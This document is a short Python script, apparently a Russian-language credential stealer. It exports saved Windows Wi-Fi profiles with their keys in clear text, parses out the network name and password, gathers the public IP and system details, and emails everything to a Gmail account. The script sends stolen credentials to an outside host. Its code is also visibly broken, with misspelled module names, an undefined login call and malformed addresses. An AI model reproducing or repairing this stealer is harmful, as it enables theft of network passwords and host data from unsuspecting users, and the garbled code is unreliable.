import subprocess as sp 
from xml.dom import minidom
import requests
from time import sleep
import platform as pf 
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket

a = input("Введите название сети : ")

sp.call( "netsh wlan show profile" )
sp.call( "netsh wlan export profile folder=C:\\  key =clear" )
def wifi_parse():
	doc = minidom.parse( "C:\\Беспроводная сеть-" + a + "0x12.xml" )

	wifi_name = doc.getElementsByTagName( "name" )
	wifi_password = doc.getElementsByTagName( "keyMaterial" )

	global data
	data = f'Wi-Fi name : { wifi_name }\nWi-Fi password : { wifi_password }'

def get_ip():
	response = requests.get( "https://myip.dnsomatic.com" )

	ip = response.text

	global data_ip
	data_ip = f"IP ADDRES : { ip }"

def info_pc():
	processor = pf.processor()
	name_sys = pf. system() + " " + pf.release()
	net_pc = pf.node()
	ip_pc = socket.gethostbyname( socket.gethostname )

	global data_pc
	data_pc = f"""
	Процессор : { processor }\n
	Система : { name_sys }\n
	Сетевое имя ПК : { net_pc }\n
	IP ADDRESS ПК : { ip_pc }\n
	"""
def all_info():
	global data_all_info
	data_all_info = f"{ data }\n { data_ip }\n { data_pc }"

def send_mail():
	msg = MIMEMultipart()
	msg [ "Subject" ] = "info for PC"
	msg [ "From" ] = "proboss982289@gmail.com"
	body = data_all_info
	msg.attach( MIMEText( body, 'plain' ) )
	server = smptplib.SMTP_SSL( "smtp.gmail.ru", 465 )
	server = login( "tigrtrtrtr.gmail.com", 14387424739 )
	server.sendmail( "tigrtrtrtr.gmail.com", "tigrtrtrtr.gmail.com", msg.as_string() )
	server.quit()

def main():
	wifi_parse()
	get_ip()
	info_pc()
	all_info()
	send_mail()

main()
